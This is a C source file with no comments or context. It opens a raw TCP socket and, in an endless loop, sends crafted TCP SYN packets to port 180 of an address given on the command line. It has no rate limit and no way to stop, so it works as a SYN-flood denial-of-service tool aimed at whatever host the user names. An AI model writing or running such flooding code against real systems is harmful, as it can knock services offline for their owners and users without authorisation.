#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <err.h>
#include <stdio.h>
#include <string.h>
#include <sysexits.h>

int
main(int argc, char *argv[])
{

	 int s, rc;
	 struct protoent *p;
	 struct sockaddr_in sin;
	 struct tcphdr tcp;
	
	 if (argc != 2)	
		 errx(EX_USAGE, "%s addr", argv[0]);
	
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = 0;

	 if (inet_pton(AF_INET, argv[1], &sin.sin_addr) <= 0)
		err(EX_USAGE, "Parse address");
		 
	p = getprotobyname("tcp");
   	 if (p == NULL)
   		err(EX_UNAVAILABLE, "getprotobyname");

	 s = socket(AF_INET, SOCK_RAW, p->p_proto);
	if (s < 0)
		err(EX_OSERR, "socket");

	memset(&tcp, 0, sizeof(tcp));

	tcp.th_sport = htons(4567);
	tcp.th_dport = htons(180);
	tcp.th_seq = 4; 
	tcp.th_ack = 0;
	tcp.th_off = 5;
	tcp.th_flags = TH_SYN;
	tcp.th_win = 65535;
	
	while(1)
	{	
	rc = sendto(s, &tcp, sizeof(tcp), 0, (struct sockaddr *)&sin,
		sizeof(sin));

	printf("Wrote %d bytes\n", rc);
	}


	    return 0;

}
